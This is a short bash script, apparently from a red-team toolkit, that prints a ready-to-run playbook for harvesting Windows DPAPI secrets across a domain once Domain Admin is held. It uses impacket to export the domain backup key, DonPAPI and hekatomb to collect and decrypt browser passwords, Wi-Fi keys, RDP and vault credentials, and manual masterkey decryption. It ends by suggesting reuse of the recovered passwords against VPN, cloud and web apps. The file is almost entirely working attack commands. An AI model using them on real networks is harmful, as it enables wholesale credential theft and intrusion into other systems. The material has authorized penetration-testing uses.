#!/usr/bin/env bash
# dpapi-harvest.sh -- domain-wide DPAPI secret recovery (DECRYPT, no GPU).
# DPAPI protects browser passwords, saved RDP creds, Wi-Fi keys, and Credential
# Manager blobs. With Domain Admin you can pull the domain BACKUP KEY and decrypt
# every user's masterkeys directly -- no cracking. This is often the richest
# post-DA credential source. Authorized engagements only.
#
# Usage: ./dpapi-harvest.sh <domain> <dc-ip> <user> <password-or-hash>
set -euo pipefail
DOMAIN="${1:?domain}"; DC="${2:?dc-ip}"; USER="${3:?user}"; SECRET="${4:?password or :nthash}"

echo "[*] 1) Grab the domain DPAPI backup key (needs DA)."
echo "    impacket-dpapi backupkeys -t '$DOMAIN/$USER:$SECRET@$DC' --export"
echo
echo "[*] 2) Automated domain-wide harvest (recommended): DonPAPI"
echo "    DonPAPI '$DOMAIN/$USER:$SECRET@<target-or-subnet>'"
echo "    # collects + decrypts browser creds, Wi-Fi, RDP, vaults; writes a loot db/HTML"
echo
echo "[*] 3) Or hekatomb for a one-shot domain sweep with the backup key:"
echo "    hekatomb -d '$DOMAIN' -u '$USER' -p '$SECRET' -dns '$DC' '$DC'"
echo
echo "[*] 4) Manual single-host: decrypt a masterkey then a blob"
echo "    impacket-dpapi masterkey -file <GUID> -sid <SID> -pvk backup.pvk"
echo "    impacket-dpapi credential -file <blob> -key <decrypted-masterkey>"
echo
echo "[i] These DECRYPT. Nothing goes to the GPU. Cracked cleartext -> reuse checks"
echo "    against your cracked NTDS set (password reuse into VPN/cloud/webapps)."
